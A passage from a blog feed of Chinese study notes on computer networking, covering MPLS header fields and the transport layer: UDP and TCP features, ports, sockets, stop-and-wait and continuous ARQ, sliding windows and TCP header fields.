id="流量工程"><a href="#流量工程" class="headerlink" title="流量工程"></a>流量工程</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416183529710.png" alt="流量工程"></p><p>(1) 网络管理员采用自定义的 FEC 就可以更好地管理网络的资源。</p><p>(2) 这种均衡网络负载的做法也称为<strong>流量工程 TE</strong> (Traffic Engineering) 或<strong>通信量工</strong>程。</p><h2 id="MPLS-首部的位置与格式"><a href="#MPLS-首部的位置与格式" class="headerlink" title="MPLS 首部的位置与格式"></a>MPLS 首部的位置与格式</h2><p>MPLS 并不要求下层的网络都使用面向连接的技术。下层的网络并不提供打标记的手段，而 IPv4 数据报首部也没有多余的位置存放 MPLS 标记。这就需要使用一种封装技术：<strong>在把 IP 数据报封装成以太网帧之前，先要插入一个 MPLS 首部</strong>。</p><p><strong>从层次的角度看，MPLS 首部就处在第二层和第三层之间。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416183818917.png" alt="image-20210416183818917"></p><p><strong>“给 IP 数据报打上标记”</strong>其实就是在以太网的帧首部和  IP 数据报的首部之间插入一个 4 字节的 MPLS 首部。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416183828881.png" alt="image-20210416183828881"></p><p><strong>MPLS 首部共包括以下四个字段：</strong></p><p>(1) 标记值（占 20 位）。可以同时容纳高达 220 个流（即 1048576 个流）。实际上几乎没有哪个 MPLS 实例会使用很大数目的流，因为通常需要管理员人工管理和设置每条交换路径。</p><p>(2) 试验（占 3 位）。目前保留用作试验。</p><p>(3) 栈S（占 1 位）。在有“标记栈”时使用。</p><p>(4) 生存时间TTL（占 8 位）。用来防止 MPLS 分组在 MPLS 域中兜圈子。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-运输层</title>
      <link href="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/"/>
      <url>/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>运输层主要是面向通信部分的最高层，同时也是用户功能中的最低层。主要有以下两点</p><ul><li>从通信和信息处理的角度看，运输层向它上面的应用层提供通信服务。</li><li>当网络的边缘部分中的两个主机使用网络的核心部分的功能进行端到端的通信时，<strong>只有</strong>位于网络边缘部分的主机的协议栈才有运输层，而网络核心部分中的路由器在转发分组时都只用到下三层的功能。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406162023935.png" alt="image-20210406162023935"></p><h2 id="逻辑通信"><a href="#逻辑通信" class="headerlink" title="逻辑通信"></a>逻辑通信</h2><p>运输层为相互通信的应用进程提供<strong>逻辑通信</strong></p><ul><li>逻辑通信：好像是这样通信，但事实上并非真的这样通信</li></ul><p>通过以下图结合来理解，在平行上，应用进程之间是通过运输层进行通信的（逻辑通信），但实际上数据的传递依旧还是要通过下一层网络层及下下层再通过路由器进行传递的</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406162844136.png" alt="image-20210406162844136"></p><p>这里举个形象的栗子：你要写信给你的盆友，你只要记得门口邮箱在哪个位置，然后投进你的信件，而不需要考虑它是怎样进行运输从而到达盆友门口邮箱里的，盆友也只用直接从他家门口邮箱里取即可，这里的邮箱好比就是运输层，你们的交流就好像是通过邮箱（逻辑通信）进行的，但实际上邮件还是依然要通过多个运输环节（五层协议）才能到达盆友家。</p><h2 id="屏蔽作用"><a href="#屏蔽作用" class="headerlink" title="屏蔽作用"></a>屏蔽作用</h2><blockquote><p>运输层向高层用户屏蔽了下面网络核心的细节，它使应用进程看见的就是好像在两个运输层实体之间有一条端到端的逻辑通信信道。</p></blockquote><p>正因为前面的逻辑通信，所以我们可以专注于运输层的两个进程通信问题，而不必去关心底层的实现</p><p>从IP层来说，通信的两端是两台主机。</p><p>从运输层的角度看，通信的真正端点并不是主机而是主机中的<strong>进程</strong>。也就是说，端到端的通信是<strong>应用进程之间的通信</strong>。</p><p><strong>端系统之间通信的含义</strong>：运行在主机A上的某个程序和运行在主机B上的另一个程序进行通信”。端到端的通信是进程之间的通信</p><h2 id="复用与分用"><a href="#复用与分用" class="headerlink" title="复用与分用"></a>复用与分用</h2><p>复用：多个应用层进程汇聚成一个传输层进程</p><p>分用：传输层的单个进程通向多个应用层进程</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406163750181.png" alt="image-20210406163750181"></p><p>形象来说：复用就是多车道变成单车道运输层，分用就是单车道分多车道通向多个应用进程（UDP会涉及到）</p><h2 id="TCP与UDP"><a href="#TCP与UDP" class="headerlink" title="TCP与UDP"></a>TCP与UDP</h2><ul><li>当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条<strong>全双工的可靠信道</strong>。</li><li>当运输层采用无连接的 UDP 协议时，这种逻辑通信信道是一条<strong>不可靠信道</strong>。 </li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406164635108.png" alt="image-20210406164635108"></p><h3 id="UDP特点"><a href="#UDP特点" class="headerlink" title="UDP特点"></a>UDP特点</h3><ul><li><strong>无连接</strong>的协议，提供无连接服务;</li><li>其传送的运输协议数据单元TPDU是UDP报文或用户数据报;</li><li>支持单播、多播、厂播;</li><li><strong>不提供可靠交付</strong>;</li><li>简单。适用于很多应用，如: 多媒体应用等。</li></ul><h3 id="TCP特点"><a href="#TCP特点" class="headerlink" title="TCP特点"></a>TCP特点</h3><ul><li>面向连接的协议，提供面向连接服务;</li><li>其传送的运输协议数据单元TPDU是TCP报文;</li><li>支持点对点单播，<strong>不支持多播、广播</strong>;</li><li>提供可靠服务;</li><li>复杂，用于大多数应用，如:万维网、电子邮件、文件传送等。</li></ul><h3 id="各自的应用范围"><a href="#各自的应用范围" class="headerlink" title="各自的应用范围"></a>各自的应用范围</h3><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406165018430.png" alt="image-20210406165018430"></p><p>其中动态主机配置DHCP是在应用层ip地址动态分配时的相关应用，HTTP协议是客户端与服务器端交互的相关规则与约定</p><h2 id="IP数据报、TCP和UDP的关系"><a href="#IP数据报、TCP和UDP的关系" class="headerlink" title="IP数据报、TCP和UDP的关系"></a>IP数据报、TCP和UDP的关系</h2><ul><li>运输层的 UDP 用户数据报与网际层的IP数据报有很大区别。<ul><li>IP 数据报要经过互连网中许多路由器的存储转发。</li><li>UDP 用户数据报是在运输层的端到端抽象的<strong>逻辑信道</strong>中传送的。</li></ul></li><li>TCP 报文段是在运输层抽象的端到端逻辑信道中传送，这种信道是可靠的全双工信道。但这样的信道却<strong>不知道究竟经过了哪些路由器，而这些路由器也根本不知道上面的运输层是否建立了 TCP 连接</strong>。 </li></ul><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><blockquote><p>运行在计算机中的进程是用进程标识符来标志的。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406165416517.png" alt="image-20210406165416517"></p><h3 id="为什么会有端口"><a href="#为什么会有端口" class="headerlink" title="为什么会有端口"></a>为什么会有端口</h3><ol><li>由于进程的创建和撤销都是动态的，发送方几乎无法识别其他机器上的进程。</li><li>有时我们会改换接收报文的进程，但并不需要通知所有发送方。</li><li>我们往往需要利用目的主机提供的功能来识别终点，而不需要知道实现这个功能的进程。</li></ol><p>虽然通信的终点是应用进程，但我们可以把端口想象是通信的终点，因为我们只要把要传送的报文交到目的主机的某一个合适的目的端口，剩下的工作（即最后交付目的进程）就由 TCP 来完成。</p><p>形象地说：ip地址更像是标识你家在哪栋楼，端口更像是标识你是哪间房</p><h3 id="硬件端口和软件端口"><a href="#硬件端口和软件端口" class="headerlink" title="硬件端口和软件端口"></a>硬件端口和软件端口</h3><ul><li>在协议栈层间的抽象的协议端口是软件端口。</li><li>路由器或交换机上的端口是硬件端口。</li></ul><p>也就是说：硬件端口是 用来连接各个硬件设备的，而软件端口则是应用层的<strong>各种协议进程与运输实体进行层间交互</strong>的一种地址</p><h3 id="端口位数"><a href="#端口位数" class="headerlink" title="端口位数"></a>端口位数</h3><p>端口用一个 16 位端口号进行标志，允许有65,535（2¹⁶）个不同的端口号</p><p>端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程。在互联网中，不同计算机的相同端口号是没有联系的。</p><p>由此可见，两个计算机中的进程要互相通信，不仅必须知道对方的端口号（为了找到对方计算机中的应用进程） ，而且还要知道对方的 IP 地址（为了找到对方的计算机）。</p><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><ul><li>服务器端使用的端口号<ul><li>熟知端口，数值一般为 0 ~ 1023。</li><li>登记端口号，数值为 1024 ~ 49151，为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在 IANA 登记，以防止重复。</li></ul></li><li>客户端使用的端口号<ul><li>又称为短暂端口号，数值为 49152 ~ 65535，留给客户进程选择暂时使用。</li><li>当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其他客户进程以后使用。 </li></ul></li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406170331878.png" alt="image-20210406170331878"></p><h1 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h1><p>UDP 只在 IP 的数据报服务之上增加了很少一点的功能</p><ol><li><strong>复用和分用</strong>的功能</li><li><strong>差错检测</strong>的功能</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406194530087.png" alt="复用和分用"></p><p>前面已经简单的介绍了UDP的特点了，这里补充其它的特点以及这些特点的优点</p><ul><li><strong>UDP 是无连接的</strong>，发送数据之前不需要建立连接，，因此减少了开销和发送数据之前的时延。</li><li><strong>UDP 使用尽最大努力交付</strong>，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</li><li><strong>UDP 是面向报文的。</strong>UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。UDP 一次交付一个完整的报文。 </li><li><strong>UDP 没有拥塞控制</strong>，因此网络出现的拥塞不会使源主机的发送速率降低。这对某些实时应用是很重要的。很适合多媒体通信的要求。 </li><li><strong>UDP 支持一对一、一对多、多对一和多对多的交互通信</strong>。</li><li><strong>UDP 的首部开销小</strong>，只有 8 个字节，比 TCP 的 20 个字节的首部要短。</li></ul><p>再来看看UDP的这两个特点</p><ul><li>发送方 UDP 对应用程序交下来的报文，在添加首部后就向下交付 IP 层。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。</li><li>应用层交给 UDP 多长的报文，UDP 就照样发送，即一次发送一个报文。</li></ul><p>这意味着什么，接收方 UDP 对 IP 层交上来的 UDP 用户数据报，在去除首部后就原封不动地交付上层的应用进程，一次交付一个完整的报文。</p><p>所以如果你的报文太长，UDP把它交给IP层后，IP层再传送时就可能要分片，这会降低IP层的效率，而如果报文太短，则IP数据报的首部相对于报文会太长，同样也会降低IP层效率，所以应用程序必须选择合适的报文长度</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406200653561.png" alt="image-20210406200653561"></p><h2 id="UDP的首部格式"><a href="#UDP的首部格式" class="headerlink" title="UDP的首部格式"></a>UDP的首部格式</h2><p>用户数据报 UDP 有两个字段：数据字段和首部字段。<br>首部字段有 8 个字节，由 4 个字段组成，每个字段都是 2 个字节</p><p>在计算检验和时，临时把 12 字节的“伪首部”和 UDP 用户数据报连接在一起。<strong>伪首部仅仅是为了计算检验和</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406200825674.png" alt="image-20210406200825674"></p><p>计算检验和这里不展开说（因为没去算），感兴趣可以通过书本理解</p><h1 id="传输控制协议TCP概述"><a href="#传输控制协议TCP概述" class="headerlink" title="传输控制协议TCP概述"></a>传输控制协议TCP概述</h1><blockquote><p>TCP 是面向连接的运输层协议，在无连接的、不可靠的 IP 网络服务基础之上提供可靠交付的服务。为此，在 IP 的数据报服务基础之上，增加了保证可靠性的一系列措施。</p></blockquote><p>同样以复用和分用进行通信</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406201305393.png" alt="image-20210406201305393"></p><h2 id="TCP-最主要的特点"><a href="#TCP-最主要的特点" class="headerlink" title="TCP 最主要的特点"></a>TCP 最主要的特点</h2><ul><li>TCP 是面向连接的运输层协议。</li><li>每一条 TCP 连接<strong>只能有两个端点</strong> (endpoint)，每一条 TCP 连接<strong>只能是点对点</strong>的（一对一）。 </li><li>TCP 提供<strong>可靠交付</strong>的服务。</li><li>TCP 提供<strong>全双工</strong>通信。</li><li><strong>面向字节流</strong><ol><li>TCP 中的“流”(stream) 指的是流入或流出进程的字节序列。</li><li>“面向字节流”的含义是：虽然应用程序和 TCP 的交互是一次一个数据块，但 TCP 把应用程序交下来的数据看成仅仅是<strong>一连串无结构的字节流</strong>。</li></ol></li></ul><p>TCP面向流的具体说明</p><blockquote><p>TCP 不保证接收方应用程序所收到的数据块和发送方应用程序所发出的数据块具有对应大小的关系。</p><p>但接收方应用程序收到的字节流必须和发送方应用程序发出的字节流完全一样。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406201834256.png" alt="image-20210406201834256"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406201944463.png" alt="image-20210406201944463"></p><p>注意：</p><ol><li>TCP 连接是一条<strong>虚连接</strong>而不是一条真正的物理连接。</li><li>TCP 对应用进程一次把多长的报文发送到 TCP 的缓存中是不关心的。</li><li>TCP 根据对方给出的<strong>窗口值</strong>（<a href="#TCP的流量控制">流量控制</a>）和<strong>当前网络拥塞</strong>（<a href="#TCP的拥塞控制">拥塞控制</a>）的程度来决定一个报文段应包含多少个字节（UDP 发送的报文长度是应用进程给出的）。</li><li>TCP 可把太长的数据块<strong>划分</strong>短一些再传送。</li><li>TCP 也可<strong>等待积累</strong>有足够多的字节后再构成报文段发送出去。</li></ol><p>后面几节会具体展示其是如何工作的（可靠传输），以及这些关键点的实现</p><h2 id="TCP的连接（套接字）"><a href="#TCP的连接（套接字）" class="headerlink" title="TCP的连接（套接字）"></a>TCP的连接（套接字）</h2><ul><li>TCP 把连接作为<strong>最基本的抽象</strong>。</li><li>每一条 TCP 连接有两个<strong>端点</strong>。</li><li>TCP 连接的端点不是主机，不是主机的IP 地址，不是应用进程，也不是运输层的协议端口。TCP 连接的端点叫做<strong>套接字 (socket) 或插口</strong>。</li><li><strong>端口号拼接到 (contatenated with) IP 地址即构成了套接字。</strong> </li></ul><p>下面通过图理解套接字</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406202414660.png" alt="image-20210406202414660"></p><p>套接字的格式：<strong>套接字 socket = (IP地址 : 端口号)</strong></p><p>例子：<strong>套接字 socket = (192.169.1.20 : 2028)</strong></p><p>每一条 TCP 连接唯一地被通信两端的两个端点（即两个套接字）所确定。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406202530840.png" alt="image-20210406202530840"></p><p>根据以上可以得出</p><ul><li>TCP 连接就是由协议软件所提供的一种抽象。</li><li>TCP 连接的端点是个很抽象的套接字，即（IP 地址：端口号）。</li><li>同一个 IP 地址可以有多个<strong>不同的 TCP 连接</strong>。</li><li>同一个端口号也可以出现在多个不同的 TCP 连接中。</li></ul><p>Socket其实有多种含义，在不同的场景其含义不同，比如</p><ul><li>应用编程接口  API  称为 socket API, 简称为 socket。</li><li>socket API 中使用的一个函数名也叫作 socket。</li><li>调用 socket 函数的端点称为 socket。</li><li>调用 socket 函数时其返回值称为 socket 描述符，可简称为 socket。</li><li>在操作系统内核中连网协议的 Berkeley 实现，称为 socket 实现</li></ul><h1 id="可靠传输的工作原理"><a href="#可靠传输的工作原理" class="headerlink" title="可靠传输的工作原理"></a>可靠传输的工作原理</h1><p>直接上图——TCP也就是建立在IP协议不可靠传输上的可靠传输（前面有讲过）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406203105228.png" alt="image-20210406203105228"></p><p>让我们试想一下：我们希望的传输是不会出差错的，也就是不论发送何种文件，你都希望它能稳定可靠的传输到目的地去，以及接收方能准时无误的接收到你传送的文件，不希望它在某个过程中出现差错，以致于你要重新去传输该文件，所以理想传输总结起来有两点：</p><ol><li>传输信道不产生差错。</li><li>不管发送方以多快的速度发送数据，接收方总是来得及处理收到的数据。</li></ol><p>然而实际上网络并非如此，它都不具备以上两个理想条件，所以我们必须使用一些可靠传输协议（TCP），在不可靠的传输信道（IP）实现可靠传输</p><h2 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h2><blockquote><p>“停止等待”就是每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。</p></blockquote><p>我们知道：TCP是提供全双工工作方式的，也就是通信双方即是发送方也可以是接收方，但是这里为了方便，只考虑单方向（双方向工作原理一致）。定为A→发送方，B→接收方</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406204405025.png" alt="image-20210406204405025"></p><p>A 发送分组 M1，发完就暂停发送，等待 B 的确认 (ACK)。B 收到了 M1 向 A 发送  ACK。A 在收到了对 M1 的确认后，就再发送下一个分组  M2。如此循环反复下去。</p><p>那么问题来了，出错了咋办，让我们先来看看接收方B在传输过程可能会出现的错误</p><p>在接收方 B 会出现两种情况：</p><ol><li>B 接收 M1 时检测出了差错，就丢弃 M1，其他什么也不做（不通知 A 收到有差错的分组）。</li><li>M1 在传输过程中丢失了，这时 B 当然什么都不知道，也什么都不做。</li></ol><p>在这两种情况下，B 都不会发送任何信息。但A都必须重发分组，直到B正确接收为止，这样才能实现可靠通信。那么问题又来了，A怎么知道自己是否该重传分组了呢，没错，超时重传</p><h3 id="超时重传（自动重传请求-ARQ）"><a href="#超时重传（自动重传请求-ARQ）" class="headerlink" title="超时重传（自动重传请求 ARQ）"></a>超时重传（自动重传请求 ARQ）</h3><ol><li>A 为每一个已发送的分组都设置了一个超时计时器。</li><li>A 只要在超时计时器到期之前收到了相应的确认，就撤销该超时计时器，继续发送下一个分组 M2 。</li><li>若A在超时计时器规定时间内没有收到B的确认，就认为分组错误或丢失，就重发该分组。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406205258419.png" alt="image-20210406205258419"></p><h3 id="编号"><a href="#编号" class="headerlink" title="编号"></a>编号</h3><p>接下来，看看超时重传会遇到的问题</p><blockquote><p>若分组正确到达B，但B回送的确认丢失或延迟了，A未收到B的确认，会超时重发。B 可能会收到重复的 M1 。B如何知道收到了重复的分组，需要丢弃呢？</p></blockquote><p>解决方法便是“编号”</p><ul><li>A为每一个发送的分组都进行编号。若B收到了编号相同的分组，则认为收到了重复分组，丢弃重复的分组，并回送确认。</li><li>B为发送的确认也进行编号，指示该确认是对哪一个分组的确认。</li><li>A根据确认及其编号，可以确定它是对哪一个分组的确认，避免重发发送。若为重复的确认，则将其丢弃。</li></ul><h3 id="确认丢失和确认迟到"><a href="#确认丢失和确认迟到" class="headerlink" title="确认丢失和确认迟到"></a>确认丢失和确认迟到</h3><p>好滴，又有问题了（你这问题怎么这么多！！！）</p><ol><li><p>如果接收方Bd的确认在路上直接丢失了呢（确认丢失）</p><p>又或者</p></li><li><p>传输过程中没有出现差错，但 B 对分组 M1 的确认迷路了，走了点弯路，然后迟到了呢（确认迟到）</p></li></ol><p>让我们先来解决第一个问题</p><blockquote><p>首先，A会<strong>超时重发</strong>，然后收到确认，这没啥可说的，重点是B，接收方B会收到两次分组，那么它会怎么做，是的，<strong>丢掉当前这一个分组并重传确认分组</strong>。为什么要重传确认，B说它之前不是发过一次了吗，当然要发，它不能认为已经发送过确认就不再发送，因为 A 之所以重传 M1 就表示 A 没有收到对 M1 的确认。</p></blockquote><p>第二个问题的解决</p><blockquote><p>首先，A收到了B延迟的M1确认，这时，它已经将缓冲的备份分组发出去了，那么当他收到第二次重复的确认时，<strong>它会丢弃重复的确认</strong></p><p>而B也仍然会收到重复的 M1，它同样会<strong>丢弃重复的 M1</strong>，并重传确认分组。</p></blockquote><p>最后，用一个图来理解这两个概念</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406211258525.png" alt="image-20210406211258525"></p><p><strong>注意</strong></p><ul><li>在发送完一个分组后，必须暂时保留已发送的分组的副本，以备重发。</li><li>分组和确认分组都必须进行编号。（区分不同的分组以及确认）</li><li>超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。 （以防迷了点小路而导致重传浪费性能）</li></ul><p>总结下停止等待协议的要点</p><ol><li><strong>停止等待</strong>。发送方每次只发送一个分组。在收到确认后再发送下一个分组。</li><li><strong>编号</strong>。对发送的每个分组和确认都进行编号。</li><li><strong>自动重传请求</strong>。发送方为每个发送的分组设置一个超时计时器。若超时计时器超时，发送方会自动重传分组。</li><li><strong>简单，但信道利用率太低</strong>。（信道利用率那一节会讲到该特点以及解决方法）</li></ol><h2 id="自动重传请求-ARQ"><a href="#自动重传请求-ARQ" class="headerlink" title="自动重传请求 ARQ"></a>自动重传请求 ARQ</h2><p>通过上面的学习：我们可以了解到B不论何时都不需要跟A说分组丢失，要它重传了，因为这些分组该来总会来的（超时重传），A不会欠B的。像上述的这种可靠传输协议常称为自动重传请求 ARQ  (Automatic Repeat reQuest)。意思是重传的请求是自动进行的，接收方不需要请求发送方重传某个出错的分组。</p><ul><li>通常 A 最终总是可以收到对所有发出的分组的确认。如果 A 不断重传分组但总是收不到确认，就说明通信线路太差，不能进行通信。</li><li>使用上述的确认和重传机制，我们就可以在不可靠的传输网络上实现可靠的通信。</li></ul><h2 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h2><p>不知道你们有没有发现：每次A发送分组后，需要等待B的确认分组到达后才会发送下次分组，这样的信道利用率是不是会有点低</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406212057270.png" alt="image-20210406212057270"></p><p>信道利用率公式</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406212330913.png" alt="image-20210406212330913"></p><p>可以看出，当往返时间 RTT 远大于分组发送时间 TD 时，信道的利用率就会非常低。<br>若出现重传，则对传送有用的数据信息来说，信道的利用率就还要降低。</p><h3 id="流水线传输"><a href="#流水线传输" class="headerlink" title="流水线传输"></a>流水线传输</h3><p>为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用流水线传输。<br>流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停顿下来等待对方的确认。这样可使信道上一直有数据不间断地传送。<br>由于信道上一直有数据不间断地传送，这种传输方式可获得很高的信道利用率。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406212431804.png" alt="image-20210406212431804"></p><h3 id="连续-ARQ协议"><a href="#连续-ARQ协议" class="headerlink" title="连续 ARQ协议"></a>连续 ARQ协议</h3><p>基本思想：</p><ol><li>发送方一次可以发出<strong>多个分组</strong>。</li><li>使用<strong>滑动窗口协议</strong>控制发送方和接收方所能发送和接收的分组的数量和编号。</li><li>协议规定：每收到一个确认，发送方就把发送窗口<strong>向前滑动</strong>。</li><li>接收方一般采用<strong>累积确认</strong>的方式。</li><li>采用<strong>回退N</strong>（Go-Back-N）方法进行重传（后面有解释）。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406212801263.png" alt="image-20210406212801263"></p><h4 id="累积确认"><a href="#累积确认" class="headerlink" title="累积确认"></a>累积确认</h4><blockquote><p>接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。</p></blockquote><ol><li>优点：容易实现，即使确认丢失也不必重传。</li><li>缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213216445.png" alt="image-20210406213216445"></p><p>如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组都再重传一次。<br>这就叫做 <strong>Go-back-N（回退 N）</strong>，表示需要再退回来重传已发送过的 N 个分组。<br>可见当通信线路质量不好时，连续 ARQ 协议会带来负面的影响。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213809411.png" alt="image-20210406213809411"></p><p>TCP 连接的每一端都必须设有两个窗口——一个<strong>发送窗口</strong>和一个<strong>接收窗口</strong>。<br>TCP 的可靠传输机制用<strong>字节的序号</strong>进行控制。TCP 所有的确认都是基于序号而不是基于报文段。<br>TCP 两端的四个窗口经常处于<strong>动态变化</strong>之中。<br>TCP连接的往返时间 RTT 也不是固定不变的。需要使用特定的算法<strong>估算较为合理的重传时间</strong>。 </p><p>滑动窗口协议比较复杂，是 TCP 协议的精髓所在。<br>发送方维持的发送窗口，它的意义是：位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认。这样，信道利用率就提高了。<br>连续 ARQ 协议规定，发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置。</p><p><strong>通过图片理解</strong></p><p>首先：定义一个发送窗口以及接收窗口</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213310884.png" alt="image-20210406213310884"></p><p>开始发送</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213550163.png" alt="image-20210406213550163"></p><p>接收到正确分组</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213611980.png" alt="image-20210406213611980"></p><p>继续下个窗口</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406213625768.png" alt="image-20210406213625768"></p><h1 id="TCP报文段的首部格式"><a href="#TCP报文段的首部格式" class="headerlink" title="TCP报文段的首部格式"></a>TCP报文段的首部格式</h1><blockquote><ol><li>TCP 虽然是面向字节流的，但 TCP 传送的数据单元却是报文段。</li><li>一个 TCP 报文段分为首部和数据两部分，而 TCP 的全部功能都体现在它首部中各字段的作用。</li><li>TCP 报文段首部的前 20 个字节是固定的，后面有 4n 字节是根据需要而增加的选项 (n 是整数)。因此 TCP 首部的最小长度是 20 字节。</li></ol></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406215738080.png" alt="image-20210406215738080"></p><p>接下来，对每个部分进行说明</p><p><strong>源端口和目的端口字段</strong>——各占 2 字节。端口是运输层与应用层的服务接口。运输层的复用和分用功能都要通过端口才能实现。 </p><p><strong>序号字段seq</strong>——占 4 字节。TCP 连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。 为当前端成功发送的数据位数</p><p><strong>确认号字段ack</strong>——占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。 </p><p>若确认号 = N，则表明：到序号N-1为止所有的数据都已正确收到</p><p><strong>数据偏移（即首部长度）</strong>——占 4 位，它指出 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远。“数据偏移”的单位是 32 位字（以 4 字节为计算单位）。 </p><p><strong>保留字段</strong>——占 6 位，保留为今后使用，但目前应置为 0。 </p><p><strong>紧急 URG</strong> —— 当 URG = 1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。 </p><p><strong>确认 ACK</strong> —— 只有当 ACK =1 时确认号字段才有效。当 ACK =0 时，确认号无效。 </p><p><strong>推送 PSH (PuSH)</strong> —— 接收 TCP 收到 PSH = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。 </p><p><strong>复位 RST (ReSeT)</strong> —— 当 RST=1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。 </p><p><strong>同步 SYN</strong> —— 同步 SYN = 1 表示这是一个连接请求（ACK = 0）或连接接受报文（ACK = 1）。 </p><p><strong>终止 FIN (FINish)</strong> —— 